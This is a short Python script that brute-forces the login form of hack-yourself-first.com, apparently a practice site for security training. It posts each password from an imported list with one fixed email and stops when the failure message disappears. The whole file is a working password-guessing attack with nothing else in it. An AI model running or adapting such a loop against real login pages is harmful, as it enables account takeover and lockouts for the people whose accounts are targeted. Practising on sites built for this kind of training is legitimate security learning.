import requests
import ImportPasswords
URL = "https://hack-yourself-first.com/Account/Login"
list = ImportPasswords.Get_Password()
for i in list:
    site_content = requests.post(URL, data={"Email":"mekifh8@rishon.il", "password":i})
    if "Please provide your email and password." not in site_content.text:
        print(f"yes! the password is {i}")
        break
    else:
        print("try again")